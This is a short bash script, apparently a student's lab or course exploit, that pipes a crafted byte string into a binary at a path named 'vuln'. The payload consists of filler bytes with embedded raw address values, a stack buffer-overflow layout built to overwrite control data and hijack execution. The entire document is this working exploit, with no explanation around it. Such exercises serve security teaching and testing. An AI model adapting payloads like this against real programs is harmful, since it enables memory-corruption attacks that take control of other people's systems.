#!/usr/bin/env bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*259 + b"\xe4\x88\xff\x43" + b"A"*260 + b"\x30\xb3\xe5\xe0" + b"A"*4 + b"\x01")' | /task1/s2888144/vuln
